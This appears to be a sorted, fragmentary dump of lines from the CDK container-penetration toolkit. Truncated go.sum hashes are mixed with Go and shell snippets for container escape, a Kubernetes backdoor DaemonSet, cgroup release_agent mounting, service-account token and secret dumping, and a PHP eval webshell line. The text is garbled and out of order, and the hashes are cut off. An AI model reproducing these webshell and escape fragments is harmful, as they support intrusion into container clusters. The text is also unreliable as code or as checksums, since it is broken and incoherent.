github.com/kr/pretty v0.2.1 h1:Fmg33tUaq4/8ym9TJN1x7sLJnHVwhP33CNkpYV/7rwI=
github.com/kr/pretty v0.2.1/go.mod h1:ipq/a2n7PKx3OHsz4KJII5eveXtPO4qwEXGdVfWzfnI=
github.com/kr/pty v1.1.1/go.mod h1:pFQYn66WHrOpPYNljwOMqo10TkYh1fy3cYio2l3bCsQ=
github.com/kr/text v0.1.0 h1:45sCR5RtlFHMR4UwH9sdQ5TC8v0qDQCHnXt
github.com/kr/text v0.1.0/go.mod h1:4Jbv
github.com/lucasb-eyer/go-colorful v1.0.3 h1:QIbQXiugsb
github.com/lucasb-eyer/go-colorful v1.0.3/go.mod h1:R4dSotOR9KMtayYi1e77YzuveK
github.com/mattn/go-colorable v0.1.9 h1:sqDoxXbdeALODt0DAeJCVp38ps9ZogZEAXjus69YV3U=
github.com/mattn/go-colorable v0.1.9/go.mod h1:u6P/XSegPjTcexA
github.com/mattn/go-isatty v0.0.12/go.mod h1:cbi8OIDigv2wuxKPP5vlRcQ1OAZbq2CE4Kysco4FUpU=
github.com/mattn/go-isatty v0.0.14 h1:yVuAays6BHfxijgZPzw
github.com/mattn/go-isatty v0.0.14/go.mod h1:7GGIvUiUoEMVVmxf/4nioHXj79iQHKdU27kJ6hsGG94=
github.com/mattn/go-runewidth v0.0.7 h1:Ei8KR0497xHyKJPAv59M1dkC
github.com/mattn/go-runewidth v0.0.7/go.mod h1:H031xJmbD/WCDINGzjvQ9THkh0rPKHF
github.com/mitchellh/go-ps v1.0.0
github.com/mitchellh/go-ps v1.0.0 h1:i6ampVEEF4wQFF
github.com/mitchellh/go-ps v1.0.0/go.mod h1:J4lOc8z8yJs6vUwklHw2XEIiT4z4C40KtWVN3nvg8Pg=
github.com/opencontainers/go-digest v1.0.0 // indirect
github.com/opencontainers/go-digest v1.0.0 h1:apOUWs51W5PlhuyGyz9FCeeBIOUDA/6nW8Oi/yOhh5U=
github.com/opencontainers/go-digest v1.0.0/go.mod h1:0JzlMkj0TRzQZfJkVvzbP0HBR3IKzErnv2BNG4W4MAM=
github.com/pkg/errors v0.9.1 h1:FEBLx1zS214owpjy7qsBeixbURkuhQAwrK5UwLGTwt4=
github.com/pkg/errors v0.9.1/go.mod h1:bwawxfHBFNV
github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
github.com/prometheus/client_model v0.0.0-20190812154241-14fe0d1b01d4/go.mod h1:xMI15A0UPsDsEKsMN9yxemIoYk6Tm2C1GtYGdfGttqA=
github.com/prometheus/procfs v0.0.0-20190522114515-bc1a522cf7b1 h1:Lo6mRUjdS99f3zxYOUalftWHUoOGaDRqFk1
github.com/prometheus/procfs v0.0.0-20190522114515-bc1a522cf7b1/go.mod h1:TjEm7ze935MbeOT/UhFTIMYKhuLP4wbCsTZCD3I8kEA=
github.com/shirou/gopsutil/v3 v3.20.10
github.com/shirou/gopsutil/v3 v3.20.10 h1:7zomV9HJv6UGk225YtvEa5
github.com/shirou/gopsutil/v3 v3.20.10/go.mod h1:igHnfak0qnw1biGeI2qKQvu0ZkwvEkUcCLlYhZzdr/4=
github.com/sirupsen/logrus v1.4.2/go.mod h1:tLMulIdttU9McNUspp0xgXVQah82FyeX6MwdIuYE2rE=
github.com/sirupsen/logrus v1.8.1 // indirect
github.com/sirupsen/logrus v1.8.1 h1:dJKuHgqk1NNQlqoA6BTlM1Wf9DOH3NBjQyu0h9
github.com/sirupsen/logrus v1.8.1/go.mod h1:yWOB1SBYBC5VeMP7gHvWumXLIWorT60ONWic61uBYv0=
github.com/stretchr/objx v0.1.0/go.mod h1:HFkY916IF
github.com/stretchr/objx v0.1.1/go.mod h1:HFkY916IF
github.com/stretchr/testify v1.2.2/go.mod h1:a8OnRcib4nhh0OaRAV
github.com/stretchr/testify v1.6.1/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=
github.com/stretchr/testify v1.7.0
github.com/stretchr/testify v1.7.0 h1:nwc3DEeHmmLAfoZucVR881uASk0Mfjw8xYJ99tb5CcY=
github.com/stretchr/testify v1.7.0/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=
github.com/tidwall/gjson v1.6.7/go.mod h1:zeFuBCIqD4sN/gmqBzZ4j7Jd6UcA2Fc56x7QFsv
github.com/tidwall/gjson v1.9.3
github.com/tidwall/gjson v1.9.3 h1:hqzS9wAHMO
github.com/tidwall/gjson v1.9.3/go.mod h1:/wbyibRr2FHMks5tjHJ5F8dMZh3AcwJEMf5vlfC0lxk=
github.com/tidwall/match v1.0.3/go.mod h1:eRSPERbgtNPcGhD8UCthc6PmLEQXEWd3PRB5JTxsfmM=
github.com/tidwall/match v1.1.1 h1:
github.com/tidwall/match v1.1.1/go.mod h1:eRSPERbgtNPcGhD8UCthc6PmLEQXEWd3PRB5JTxsfmM=
github.com/tidwall/pretty v1.0.2/go.mod h1:XNkn88O1ChpSDQmQeStsy
github.com/tidwall/pretty v1.2.0 h1:RWIZEg2iJ8/g6fDDYzMpobmaoGh5OLl4AXtGUGPcqCs=
github.com/tidwall/pretty v1.2.0/go.mod h1:ITEVvHYasfjBbM0u2Pg8T2nJnzm8xPwvNhhsoaGGjNU=
github.com/tidwall/sjson v1.1.4
github.com/tidwall/sjson v1.1.4 h1:bTSsPLdAYF5QNLSwYsKfBKKTnlGbIuhqL3CpRsjzGhg=
github.com/tidwall/sjson v1.1.4/go.mod h1:wXpKXu8CtDjKAZ
github.com/yuin/goldmark v1.1.27/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=
github.com/yuin/goldmark v1.2.1/go.mod h1:3hX8gzYuyVAZsxl0MRgGTJEmQBFcNTphYh9decYSb74=
go 1.16
go build
go func ()  {
go func() {
go func(c net.Conn) {
golang.org/x/crypto v0.0.0-20190308221718-c2843e01d9a2/go.mod h1:djNgcEr1/C05ACkg1iLfiJU5Ep61QUkGW8qpdssI0
golang.org/x/crypto v0.0.0-20191011191535-87dc89f01550/go.mod h1:yigFU9vqHzYiE8UmvKecakEJjdnWj3jj499lnFckfCI=
golang.org/x/crypto v0.0.0-20200622213623-75b288015ac9/go.mod h1:LzIPMQfyMNhhGPhUkYOs5KpL4U8rLKemX1yGLhDgUto=
golang.org/x/exp v0.0.0-20190121172915-509febef88a4/go.mod h1:CJ0aWSM057203Lf6IL
golang.org/x/lint v0.0.0-20181026193005-c67002cb31c3/go.mod h1:UVdnD1Gm6xHRNCYTkRU2/jEulfH38KcIWyp/GAMgvoE=
golang.org/x/lint v0.0.0-20190227174305-5b3e6a55c961/go.mod h1:wehouNa3lNwaWXcvxsM5YxQ5yQlVC4a0KAMCusXpPoU=
golang.org/x/lint v0.0.0-20190313153728-d0100b6bd8b3/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=
golang.org/x/mod v0.2.0/go.mod h1:s0Qsj1ACt9ePp/hMypM3fl4fZqREWJwdYDEqhRiZZUA=
golang.org/x/mod v0.3.0/go.mod h1:s0Qsj1ACt9ePp/hMypM3fl4fZqREWJwdYDEqhRiZZUA=
golang.org/x/net v0.0.0-20180724234803-3673e40ba225/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
golang.org/x/net v0.0.0-20180826012351-8a410e7b638d/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
golang.org/x/net v0.0.0-20190213061140-3a22650c66bd/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
golang.org/x/net v0.0.0-20190311183353-d8887717615a/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=
golang.org/x/net v0.0.0-20190404232315-eb5bcb51f2a3/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=
golang.org/x/net v0.0.0-20190620200207-3b0461eec859/go.mod h1:z5CRVTTTmAJ677TzLLGU
golang.org/x/net v0.0.0-20200226121028-0de0cce0169b/go.mod h1:z5CRVTTTmAJ677TzLLGU
golang.org/x/net v0.0.0-20201021035429-f5854403a974/go.mod h1:sp8m0HH
golang.org/x/net v0.0.0-20220630215102-69896b714898
golang.org/x/net v0.0.0-20220630215102-69896b714898 h1:K7wO6V1IrczY9QOQ2WkVpw4JQSwCd52UsxVEirZUfiw=
golang.org/x/net v0.0.0-20220630215102-69896b714898/go.mod h1:XRhObCWvk6IyKnWLug
golang.org/x/oauth2 v0.0.0-20180821212333-d2e6202438be/go.mod h1:N/0e6XlmueqKjAGxoOufVs8QHGRruUQn6yWY3a
golang.org/x/sync v0.0.0-20180314180146-1d60e4601c6f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sync v0.0.0-20181108010431-42b317875d0f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sync v0.0.0-20181221193216-37e7f081c4d4/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sync v0.0.0-20190423024810-112230192c58/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sync v0.0.0-20190911185100-cd5d95a43a6e/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sync v0.0.0-20201020160332-67f06af15bc9/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sync v0.0.0-20210220032951-036812b2e83c
golang.org/x/sync v0.0.0-20210220032951-036812b2e83c h1:5KslGYwFpkhGh
golang.org/x/sync v0.0.0-20210220032951-036812b2e83c/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sys v0.0.0-20180830151530-49385e6e1522/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
golang.org/x/sys v0.0.0-20190215142949-d0b11bdaac8a/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
golang.org/x/sys v0.0.0-20190412213103-97732733099d/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20190422165155-953cdadca894/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20190626150813-e07cf5db2756/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20191026070338-33540a1f6037/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20200116001909-b77594299b42/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20200120151820-655fe14d7479/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20200223170610-d5e6a3e2c0ae/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20200930185726-fdedc70b468f/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20201024232916-9f70ab9862d5/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20210615035016-665e8c7367d1/go.mod h1:oPkhp1MJrh7nUepCBck5
golang.org/x/sys v0.0.0-20210630005230-0f9fa26af87c/go.mod h1:oPkhp1MJrh7nUepCBck5
golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a h1:dGzPydgVsqGcTRVwiLJ1jVbufYwmzD3LfVPLKsKg
golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a/go.mod h1:oPkhp1MJrh7nUepCBck5
golang.org/x/term v0.0.0-20210927222741-03fcf44c2211/go.mod h1:jbD1KX2456YbFQfuXm/mYQcufACuNUgVhRMnK/tPxf8=
golang.org/x/text v0.3.0/go.mod h1:NqM8EUOU14njkJ3fqMW
golang.org/x/text v0.3.3/go.mod h1:5Zoc/QRtKVWzQhOtBMvqHzDpF6irO9z98xDceosuGiQ=
golang.org/x/text v0.3.7 h1:olpwvP2KacW1ZWvsR7uQhoyTYvKAupfQrRGBFM352Gk=
golang.org/x/text v0.3.7/go.mod h1:u
golang.org/x/tools v0.0.0-20180917221912-90fa682c2a6e/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
golang.org/x/tools v0.0.0-20181030221726-6c7e314b6563/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
golang.org/x/tools v0.0.0-20190114222345-bf090417da8b/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
golang.org/x/tools v0.0.0-20190226205152-f727befe758c/go.mod h1:9Yl7xja0Znq3iFh3HoIrodX9oNMXvdceNzlUR8zjMvY=
golang.org/x/tools v0.0.0-20190311212946-11955173bddd/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=
golang.org/x/tools v0.0.0-20190524140312-2c0ae7006135/go.mod h1:RgjU9mgBXZiqYHBnxXauZ1Gv1EHHAz9KjViQ78xBX0Q=
golang.org/x/tools v0.0.0-20191119224855-298f0cb1881e/go.mod h1:b
golang.org/x/tools v0.0.0-20200619180055-7c47624df98f/go.mod h1:EkVYQZoAsY45
golang.org/x/tools v0.0.0-20210106214847-113979e3529a/go.mod h1:emZCQorbCU4vsT4fOWvOPXz4eW1wZW4PmDk9uLelYpA=
golang.org/x/xerrors v0.0.0-20190717185122-a985d3407aa7/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
golang.org/x/xerrors v0.0.0-20191011141410-1b5146add898/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
golang.org/x/xerrors v0.0.0-20191204190536-9bdfabe68543/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1 h1:go1bK/D/BFZV2I8cIQd1NKEZ
golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
google.golang.org/appengine v1.1.0/go.mod h1:EbEs0AVv82hx2wNQdGPgUI5lhzA/G0D9YwlJXL52JkM=
google.golang.org/appengine v1.4.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv
google.golang.org/genproto v0.0.0-20180817151627-c66870c02cf8/go.mod h1:JiN7NxoALGmiZfu7CAH4rXhgtRTLTxftemlI0sWmxmc=
google.golang.org/genproto v0.0.0-20190819201941-24fa4b261c55/go.mod h1:DMBHOl98Agz4BDEuKkezgsaosCRResVns1a3J2ZsMNc=
google.golang.org/genproto v0.0.0-20200117163144-32f20d992d24 h1:wDju
google.golang.org/genproto v0.0.0-20200117163144-32f20d992d24/go.mod h1:n3cpQtvxv34hfy77yVDNjmbRyujviMdxYliBSkLhpCc=
google.golang.org/grpc v1.19.0/go.mod h1:mqu4LbDTu4XGKhr4mRzUsmM4RtVoemTSY81AxZiDr8c=
google.golang.org/grpc v1.23.0/go.mod h1:Y5yQAOtifL1yxbo5wqy6BxZv8vAUGQwXBOALyacEbxg=
google.golang.org/grpc v1.26.0 h1:2dTRdpdFEEhJYQD8EMLB61nnrzSCTbG38PhqdhvOltg=
google.golang.org/grpc v1.26.0/go.mod h1:qbnxyOmOxrQa7FizSgH
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
gopkg.in/check.v1 v1.0.0-20190902080502-41f04d3bba15 // indirect
gopkg.in/check.v1 v1.0.0-20190902080502-41f04d3bba15 h1:YR8cESwS4TdDjEe65xsg0ogRM/Nc3DYOhEAlW
gopkg.in/check.v1 v1.0.0-20190902080502-41f04d3bba15/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
gopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c h1:dUUwHk2QECo/6vqA44rthZ8ie2QXMNeKRTHCNY2nXvo=
gopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c/go.mod h1:K4uyk7z7BCEPqu6E
handleFd = int(handle.Fd())
helpMsg()
honnef.co/go/tools v0.0.0-20190102054323-c2f93a96b099/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
honnef.co/go/tools v0.0.0-20190523083050-ea95bdfd59fc/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
hostPath := findHostPath(mountInfos)
hostPath = j[9:]
hour
http
http.Client{
http.Client{}
http.Request
http.Response
http.Transport{
httpc := http.Client{
httpclient := 
i)capeff:
i)ssh
i71rQMx5EYifcz6MCKuco9NR6JIITiCfzQ=
i7ruzyGqttikkLy0=
id=1072
id=1712
id=1903
id=779110
id=808
if !CheckDebugfs() {
if !CheckDockerRemoteAPI(api) {
if !k8sExploit {
if !matched {
if !s.IsDir() {
if !silent {
if !util.IsDir(pidDir) {
if ((BASH_VERSINFO[0] < 4))
if (fi.Mode() 
if CapHexToText(k) != v {
if IsDir(f.Name()) {
if [ $MODE -eq 3 ]
if __name__ == '__main__':
if a == e {
if args == nil 
if autoEscape(cmd) {
if b == 0 {
if cgVer != 1 {
if chroot {
if color {
if command {
if conf.ScanFileTextConf.SkipExecutableFile 
if config.Help 
if config.Listen {
if config.Verbose {
if constraints.Check(v) {
if dev == 0 {
if e != nil {
if e.Err != nil {
if enableSysPtraceCap(mask) {
if end == 0 {
if err != nil 
if err != nil {
if err := c.Close()
if err := cmd.Run()
if err := recover()
if err = unix.Fchdir(fd)
if err == nil 
if err == nil {
if err == nil { // exploit success
if err1 != nil {
if exploitSuccess {
if file.Mode() 
if fileInfo.IsDir() {
if fileInfo.Size() > conf.ScanFileTextConf.MaxFileByte {
if findDevicesAllowPath(
if findTargetMountPoint(
if flag == uint64(1) {
if found == -1 {
if hasUpper {
if i != index 
if i >= len(lines) {
if idx := int(cache 
if int(handle.Fd()) > 0 {
if int(writeHandle.Fd()) > 0 {
if isPrivContainer {
if l != 1 {
if l == -1 
if l == -1 {
if l.Color {
if l.Level >= DEBUG {
if l.Level >= INFO {
if l.Level >= WARNNING {
if len(addCaps) > 0 {
if len(args) != 1 {
if len(args) != 2 {
if len(args) != 3 
if len(args) != 3 {
if len(args) != 4 {
if len(args) < 1 {
if len(args) <= 1 {
if len(args) == 0 {
if len(args) == 1 {
if len(args) == 3 {
if len(args) == 4 {
if len(args) >= 3 {
if len(blockId) != 2 {
if len(data) > 0 {
if len(devices) > 0 {
if len(exploitSubSys) == 0 {
if len(fields) <= 1 
if len(fields) == 2 {
if len(file) > 0 {
if len(fromTo) == 2 {
if len(host) == 0 
if len(hostPath) == 0 {
if len(lst) == 2 {
if len(matches) == 0 {
if len(opts.Token) > 0 {
if len(opts.Url) == 0 {
if len(os.Args) != 2 {
if len(os.Args) == 1 {
if len(params) != 4 {
if len(params) < 2 {
if len(params) > 0 {
if len(parts) != 2 {
if len(res) == 0 {
if len(resp) > 0 
if len(results) != 2 {
if len(setuidfiles) > 0 {
if len(shellCmd) > 0 {
if len(str) > 1000 {
if len(tIp) != 4 {
if m != len(resBytes) {
if matched == nil {
if matches == nil {
if mi.MountPoint == cgroupDevicePath {
if mi.MountPoint == hostDeviceFlag {
if n == -1 {
if n == 0 
if nlink == 1 { // soft link ==1
if ok.(bool) 
if opt.TlsConfig == nil 
if opts.Anonymous {
if os.IsNotExist(err) {
if pid == 0 {
if plugin.Exploits[name] == nil {
if privServiceAccount {
if r := recover()
if raw[7] == byte(1) {
if relIdx == -1 {
if remain == 0 {
if res.StatusCode == 200 {
if resp != nil {
if resp.StatusCode == http.StatusSwitchingProtocols {
if subSystemName = FindReleaseAgentSubSystem()
if sys := fileInfo.Sys()
if targetDir = FindDir(releaseAgentPath)
if tokenErr != nil {
if urlErr != nil {
if util.FileExist(input) {
if util.FindTargetDeviceID(
if util.IsDir(currentPath) {
ifconfig
image := args[1]
image := args[2]
imageRegistryURL := args[0]
import (
import os
import shlex
import subprocess
import time
include <stdio.h>
input := bufio.NewScanner(os.Stdin)
input args
inputArgs := args[2]
int main(void)
int64 
ip := base 
ipRange   string
ipStart := fromTo[0]
ips[i] = ip
isPrivContainer := evaluate.GetProcCapabilities()
j0Q57/I=
jE2L00=
jSD5QQG07SY=
java
k8sExploit := false
k8sExploit = privServiceAccount 
kN2VEUnK/pcBlmesArF7c=
kVtyUA=
kaKSTVE=
kcurl
kcurl - send HTTP request to K8s api-server.
kernelExploitSuggester()
key = key 
kind: ClusterRoleBinding
kind: CronJob
kind: DaemonSet
kind: Job
kind: Pod
kind: ServiceAccount
kube
kubectl.K8sRequestOption{
kubectl.KubectlToolApi(args)
kubernetes
l := -1
l = i
lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=
letterIdxBits = 6                    // 6 bits to represent a letter index
letterIdxMax  = 63 / letterIdxBits   // 
lightyellow='
limitations under the License.
line := scanner.Text()
linux(
ln -s targetfile /var/log/targetfile
lock      
log.Fatal(err)
log.Fatal(err.Error())
log.Fatal(exp.Desc())
log.Fatal(p.Desc())
log.Fatalln(err)
log.Logger
log.Lshortfile)
log.Printf(YellowBold.Sprint(key))
log.Printf(key)
log.Println(err)
log.Println(payloadData)
log.SetOutput(
logLinkRegx := 
logPageSubString := 
logger 
loglistText 
lower version support comments reserved.
m.Device = util.RedBold.Sprint(m.Device)
m.Fstype = util.RedBold.Sprint(m.Fstype)
m.MountPoint = util.RedBold.Sprint(m.Device)
m.Root = util.RedBold.Sprint(m.Root)
m/2kptfBszLMUkC4ZK/EgS/cQ=
m2gUSrubnMI=
mAzfO9JrbApNNgaTdGDITg=
matchset := make(map[string]bool)
matchset[sockname] = true
metadata:
mi := MountInfo{}
mi) {
mi.Device = fields[1]
mi.Fstype = fields[0]
mi.Major = blockId[0]
mi.Minor = blockId[1]
mi.MountPoint = fields[4]
mi.Root = fields[3]
mkdir -p /mnt/cgrp1
mkdir -p /mnt/cgrp1/x
mlH53w=
module github.com/cdk-team/CDK
mount -t cgroup -o rdma cgroup /mnt/cgrp1
mountPoint = mount.MountPoint
mv cdk_
n %s 
n := -1
n = i 
n cmd:%s
n image:%s
n schedule:%s
n%-80s
n/g')
n6qEh6GW0/ggAO0bMm/m
n=01102015
n=02012016
nOutput:
n[Auto Escape - Deploy K8s Backdoor Daemonset]
n[Auto Escape - K8s API Server]
n[Auto Escape - Privileged Container]
n[Auto Escape - Shared Net Namespace]
n[Auto Escape - docker.sock]
n[Information Gathering - Cgroups]
n[Information Gathering - SIDs]
n[Information Gathering - System Info]
n[test] run success
name string
nc -lvp 999 < cdk
net.SRV
netcat <https://netcat.lutai.network>
netcat version: netcat/1.6.0
netcat.RunVendorNetcat()
netstat
netstat.RunNetstat()
network.GetLocalAddresses()
nexcepted {} pattern:
nfound %s in: %s
nginx
nlink := uint64(stat.Nlink)
nsysctl -w fs.file-max=1048576
nsysctl -w fs.inotify.max_queued_events=16384
nsysctl -w fs.inotify.max_user_instances=16384
nsysctl -w fs.inotify.max_user_watches=524288
nsysctl -w net.core.somaxconn=65535
nsysctl -w net.ipv4.ip_local_port_range=
numb = numb >> 1
o6vUJrdnUu04hMope9wVRipJSqc=
o8qH0wwXwYZr8TS3Oi6o0r6Gce1SSxlDquU=
oQHNcck=
opcTcQFZebYjWzi34vdm4Q=
opt := EtcdRequestOption{
opt := etcdctl.EtcdRequestOption{
opt.Api = u.Path
opt.PostData = GenerateQuery(args[2])
opt.PostData = etcdctl.GenerateQuery(k)
opt.TlsConfig = 
opt_checksec_mode=false
opt_cvelist_file=false
opt_fetch_bins=false
opt_fetch_srcs=false
opt_full=false
opt_kernel_only=false
opt_kernel_version=false
opt_pkglist_file=false
opt_show_dos=false
opt_skip_more_checks=false
opt_skip_pkg_versions=false
opt_summary=false
opt_uname_string=false
opt_userspace_only=false
options:
opts := K8sRequestOption{
opts := kubectl.K8sRequestOption{
opts = kubectl.K8sRequestOption{
opts.Anonymous = true
opts.Method = strings.ToUpper(opts.Method)
opts.PostData = args[3]
opts.Token = sysToken
opts.Token = token
opts.TokenPath = args[0]
opts.TokenPath = conf.K8sSATokenDefaultPath
opts.TokenPath = token
opts.TokenPath = tokenPath
opts.Url = args[2]
opts.Url = opts.Server 
opts.Url = server 
optsDeploy := kubectl.K8sRequestOption{
optsSvc := kubectl.K8sRequestOption{
originalInfo := sc.Text()
os.Args = args
os.Args = os.Args[1:]
os.Exit(0)
os.O_WRONLY
os.Stdout = rescueStdout
os.Stdout = w
out = stdout.String()
output
pInt = 1
package base
package capability
package cli
package cli_test
package conf
package credential_access
package discovery
package dockerd_api
package errors
package escaping
package etcdctl
package evaluate
package exploit
package hwexp
package kubectl
package main
package netcat
package netstat
package network
package persistence
package plugin
package privilege_escalation
package probe
package ps
package remote_control
package task
package util
package vi
panic(
panic(err)
params := pattern.FindStringSubmatch(ans)
params := pattern.FindStringSubmatch(string(data))
params = pattern.FindStringSubmatch(string(data))
parseArgs()
parseDocopt()
parseUname() {
passwordInput := args[2]
passwordList := normalizeInput(passwordInput)
pat := regexp.MustCompile(pspRegexPat)
path := args[1]
pattern := regexp.MustCompile(
pattern := regexp.MustCompile(v)
pattern = regexp.MustCompile(
payloadShellCmd = shellCmd
pc6Ldnwhi/IjpwHt7yyuwOQ=
pdir=
perdir=
perl
php @eval($_POST['$SECRET_PARAM'])
pidStr = fmt.Sprint(pid)
pkg=.
plugin.ListAllExploit()
plugin.RunSingleExploit(name)
podCgroupPath = mi.Root
pool := x509.NewCertPool()
pool.AppendCertsFromPEM(caData)
portRange []FromTo
post) <socket> <uri> <data>    Make request to docker unix socket.
post) <uri> <data>      Make request to K8s api-server.
post) <uri> [<data>]    Make request to K8s api-server.
post) <url> [<post_data>]
ppdir=
prefix := DebugPrefix
prefix := ErrorPrefix
prefix := InfoPrefix
prefix := WarnPrefix
prefix = ColorDebugPrefix
prefix = ColorErrorPrefix
prefix = ColorInfoPrefix
prefix = ColorWarnPrefix
print(conf.ThinIgnoreTool)
privServiceAccount := evaluate.CheckPrivilegedK8sServiceAccount(conf.K8sSATokenDefaultPath)
probe
probe.TCPScanExploitAPI(args[0])
procDir := args[0]
project_dir=
ps := 
ps.RunPs()
ps.Start()
python
q10B
quit := make(chan struct{})
r := bufio.NewReader(f)
rOZCMBJ
rand.Seed(time.Now().UnixNano())
randKey := util.RandString(5)
rcurl
reExecCmd.Stderr = os.Stderr
reExecCmd.Stdout = os.Stdout
reExecCmd.SysProcAttr = 
ref    = defaultRef
ref = args[0]
reg := regexp.MustCompile(
reg = regexp.MustCompile(
relStr := string(utsInfo.Release[:])
remain--
remoteIP := args[2]
remotePort := args[3]
require (
res := make(map[string]string)
res := string(content)
res[link] = status
rescueStdout := os.Stdout
resp = dumpK8sConfigmapAnonymous(addr)
resp = dumpK8sSecretsAnonymous(addr)
result <- cli.ParseCDKMain()
result)
results := versionPattern.FindStringSubmatch(resp)
ret[string(name)] = string(v)
return
return 
return !fileInfo.IsDir()
return 0
return ExploitLXCFS()
return ExploitLXCFSCgroup()
return GetCgroup(0)
return K8sMitmPayloadDeploy
return K8sMitmPayloadSvc
return addCaps
return b.ExploitType
return buffer.String()
return convert
return convert.conn.Read(p)
return convert.conn.Write(p)
return devicesAllowPath
return e.CustomMsg
return err
return false
return fileInfo.IsDir()
return filepath.SkipDir
return filepath.SkipDir // skip soft link or it will run into container runtime filesystem
return filepath.SkipDir // stop dive if sensitive dir found
return flag
return fmt.Sprintf(
return i
return inputList
return int(((ret1 
return json
return k8sBackdoorDaemonsetJson
return k8sDaemonsetApi
return mask
return nil
return params[1] 
return path
return path 
return protocol 
return resBytes
return resp
return result
return results[i].Port < results[j].Port
return s.IsDir()
return sb.String()
return sortedExploits[i].ExploitType < sortedExploits[j].ExploitType
return stats[i].Type < stats[j].Type
return string(b)
return string(data)
return string(orig)
return string(orig[l:n])
return string(out)
return subSystemName
return success
return true
rhost := args[1]
rkHYY13jYWTU97c=
rm ../../cdk_release_binary/cdk_
roYkvgYkIh4xh/qjgUK9TdY2XT94GE=
roleRef:
root:
rport := args[2]
ruby
rwdDfMAkV7OtwuqBVzrE8GR6GFx
s := 
s := strings.TrimSpace(string(out))
sBenx6DDtFZJxhVysOjyk=
sEnc := b64.StdEncoding.EncodeToString([]byte(login))
s][0-9a-f]{32}['
sb := strings.Builder{}
sb.Grow(n)
sb.WriteByte(letterBytes[idx])
sc := bufio.NewScanner(datafd)
scan-dir                 Read all files under target dir and dump AK token.
scanner := bufio.NewScanner(file)
scanner := bufio.NewScanner(strings.NewReader(string(data)))
scheduleExpr = schedule
screen.Screen{}
script := conf.KernelExploitScript
section: 3rd party kernel protection mechanisms:
section: Attack Surface:
section: Hardware-based protection features:
